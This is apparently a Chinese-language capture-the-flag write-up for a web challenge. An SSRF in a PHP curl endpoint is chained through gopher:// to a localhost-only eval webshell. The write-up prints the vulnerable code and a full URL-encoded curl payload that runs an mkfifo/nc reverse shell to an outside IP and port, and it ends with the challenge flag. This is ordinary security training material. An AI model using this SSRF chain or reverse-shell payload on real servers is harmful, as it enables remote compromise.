BabyWeb 600 points
================

题意
-------------

Just find one way to use webshell. : )

http://host:port

解题步骤
-------------

打开网址，看到的是：

```
<?php 
function curl($url){ 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    $re = curl_exec($ch); 
    curl_close($ch); 
    return $re; 
} 
if(!empty($_GET['url'])){ 
    $url = $_GET['url']; 
    curl($url); 
}else{ 
    highlight_file(__FILE__);  
} 
```

显然是一个 `SSRF(Server Side Request Forge)` 了。用 `file:///` 协议随便看了些文件，没找到什么有用的信息。然后打开 `robots.txt` ：

```
User-agent: *
Disallow: /webshe11111111.php
```

根据这个地址，访问 `file:///var/www/html/webshe11111111.php` ：

```
<?php
$serverList = array(
    "127.0.0.1"
);
$ip = $_SERVER['REMOTE_ADDR'];
foreach ($serverList as $host) {
    if ($ip === $host) {
        if ((!empty($_POST['admin'])) and $_POST['admin'] === 'h1admin') {
            @eval($_POST['hacker']);
        } else {
            die("You aren't admin!");
        }
    } else {
        die('This is webshell');
    }
}
```

所以我们需要：

1. 从本地 POST
2. 在 POST 中传 body
3. 通过 body 中 hacker 参数打开一个反弹 shell

这些不能通过 `http://` 完成，但是通过 `gopher://` 协议，我们可以手动构造一个 `HTTP POST` 请求。

```
转义前：
POST /webshe11111111.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
admin=h1admin&hacker=system("reverse_shell")

转义后：
curl -vvv "202.112.51.130:8016/?url=gopher%3A%2F%2F127%2E0%2E0%2E1%3A80%2F%5FPOST%2520%2Fwebshe11111111%2Ephp%2520HTTP%2F1%2E1%250D%250AHost%3A%2520127%2E0%2E0%2E1%250D%250AContent%2DType%3A%2520application%2Fx%2Dwww%2Dform%2Durlencoded%250D%250AContent%2DLength%3A%2520182%250D%250A%250D%250Aadmin%3Dh1admin%26hacker%3Dsystem%252528%252522rm%252520%25252Ftmp%25252Ff%25253Bmkfifo%252520%25252Ftmp%25252Ff%25253Bcat%252520%25252Ftmp%25252Ff%25257C%25252Fbin%25252Fsh%252520%25252Di%2525202%25253E%2525261%25257Cnc%252520123%25252E123%25252E123%25252E123%2525201233%252520%25253E%25252Ftmp%25252Ff%252522%252529%25253B"
```

就可以拿到反弹的 `shell` 了，读取 `fl11111aaaaaggggg.php` 的内容：

```
<?php $flag="THUCTF{Th1s_EaSy_sSRF}";?>
```